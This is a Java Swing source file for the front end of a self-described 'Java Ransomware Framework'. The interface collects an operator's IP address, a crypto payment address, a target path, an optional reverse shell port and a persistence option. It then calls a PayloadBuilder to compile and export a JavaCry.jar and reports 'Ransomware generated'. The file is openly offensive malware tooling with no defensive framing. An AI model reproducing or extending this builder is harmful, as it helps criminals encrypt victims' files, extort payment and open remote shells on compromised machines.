import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.nio.file.Path;
import java.nio.file.Paths;
 
public class JRFUI {
    /**
     * Create the GUI and show it.  For thread safety,
     * this method should be invoked from the
     * event-dispatching thread.
     */
    private static void createAndShowGUI() {
        String[] labels = {"Local IP address: ", "Target path: ", "Export path: ", "Reverse shell port (any except 5555 and 6666): "};
        int numPairs = labels.length;
 
        //Create and populate the panel.
         JPanel p = new JPanel(new SpringLayout());
         p.setPreferredSize(new Dimension(600,300));
         JPanel statusPanel = new JPanel();
         statusPanel.setPreferredSize(new Dimension(600, 100));
         JLabel ipLabel = new JLabel("Local IP address: ", JLabel.TRAILING);
         p.add(ipLabel);
         JTextField ipInput = new JTextField(10);
         ipLabel.setLabelFor(ipInput);
         p.add(ipInput);

         JLabel addrLabel = new JLabel("Crypto Address: ", JLabel.TRAILING);
         p.add(addrLabel);
         JTextField addrInput = new JTextField(10);
         addrLabel.setLabelFor(addrInput);
         p.add(addrInput);

         JLabel tgtLabel = new JLabel("Target path: ", JLabel.TRAILING);
         p.add(tgtLabel);
         JTextField tgtInput = new JTextField(10);
         tgtLabel.setLabelFor(tgtInput);
         p.add(tgtInput);

         JLabel revLabel = new JLabel("Use reverse shell: ", JLabel.TRAILING);   
         p.add(revLabel);
         JCheckBox useRev = new JCheckBox(); 
         useRev.setToolTipText("If enabled, the reverse shell port is required.");
         p.add(useRev);

         JLabel portLabel = new JLabel("Reverse shell port: ", JLabel.TRAILING);
         p.add(portLabel);
         JTextField portInput = new JTextField(10);
         portLabel.setLabelFor(portInput);
         p.add(portInput);
         portLabel.setEnabled(false);
         portInput.setEnabled(false);

         JLabel perLabel = new JLabel("Use persistence: ", JLabel.TRAILING);
         p.add(perLabel);
         JCheckBox perInput = new JCheckBox(); 
         perInput.setToolTipText("If enabled, the decryptor would try for persistence, which could be detected.");
         p.add(perInput);
         perLabel.setEnabled(false);
         perInput.setEnabled(false);

         JLabel expLabel = new JLabel("Export path: ", JLabel.TRAILING);
         p.add(expLabel);
         JTextField expInput = new JTextField(10);
         expLabel.setLabelFor(expInput);
         p.add(expInput);

         JLabel empty = new JLabel(" ", JLabel.TRAILING);
         p.add(empty);
         JButton genButton = new JButton("Generate");
         p.add(genButton);

         // p.add(new JLabel());
         // JLabel status = new JLabel("Hello!");
         // p.add(status);

         JLabel status = new JLabel("Hello!");
         statusPanel.add(status);

         useRev.addActionListener(
         new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
               JCheckBox useRev = (JCheckBox) e.getSource();
               if (useRev.isSelected()) {
                  portLabel.setEnabled(true);
                  portInput.setEnabled(true);
                  perLabel.setEnabled(true);
                  perInput.setEnabled(true);
               } else {
                  portLabel.setEnabled(false);
                  portInput.setEnabled(false);
                  perLabel.setEnabled(false);
                  perInput.setEnabled(false);
               }
            }
          });

          genButton.addActionListener(
         new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
               String CryptAddress = addrInput.getText();
               String host = ipInput.getText();
               String tgtPath = tgtInput.getText();
               String expPath = expInput.getText();
               boolean useRevShell = useRev.isSelected();
               int revPort = 0;
               if (CryptAddress.equals("")) {
                  CryptAddress = "[My Address]";
               }
               try {
                  revPort = Integer.parseInt(portInput.getText());
               }
               catch (Exception err) {
                  if (useRevShell) {
                     status.setText("Inputting an integer port is required.");
                     return;
                  } else {
                     revPort = 0;
                  }
                  
               }

               

               try {
                  File file = new File(expPath);
                  if (!file.isDirectory()) {
                     status.setText("No such directory.");
                     return;
                  }
               }
               catch (Exception err) {
                  status.setText("No such directory.");
                  return;
               }
               boolean usePersistence = perInput.isSelected();
               
               PayloadBuilder builder = new PayloadBuilder(tgtPath, CryptAddress, useRevShell, usePersistence, host, revPort);
               builder.build();
               builder.compile();


               try {
                  Files.copy(new FileInputStream(new File("../../output/Classes/JavaCry.jar")), Paths.get(expPath, "JavaCry.jar"), StandardCopyOption.REPLACE_EXISTING);
                  status.setText("Ransomware generated at " + expPath);
               } catch (Exception err) {
                  System.out.println(err);
               }
               
            }
          });

        //Lay out the panel.
        SpringUtilities.makeCompactGrid(p,
                                        8, 2, //rows, cols
                                        6, 6,        //initX, initY
                                        10, 10);       //xPad, yPad
 
        //Create and set up the window.
        JFrame frame = new JFrame("Java Ransomware Framework");
        frame.setLayout(new GridLayout(2,1));
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
 
        //Set up the content pane.
        p.setOpaque(true);  //content panes must be opaque

        frame.add(p);

        frame.add(statusPanel);
 
        //Display the window.
        frame.pack();
        frame.setVisible(true);
    }

    public static void start() {
      javax.swing.SwingUtilities.invokeLater(new Runnable() {
         public void run() {
             createAndShowGUI();
         }
     });
    }
 
    public static void main(String[] args) {
        //Schedule a job for the event-dispatching thread:
        //creating and showing this application's GUI.
        javax.swing.SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                createAndShowGUI();
            }
        });
    }
}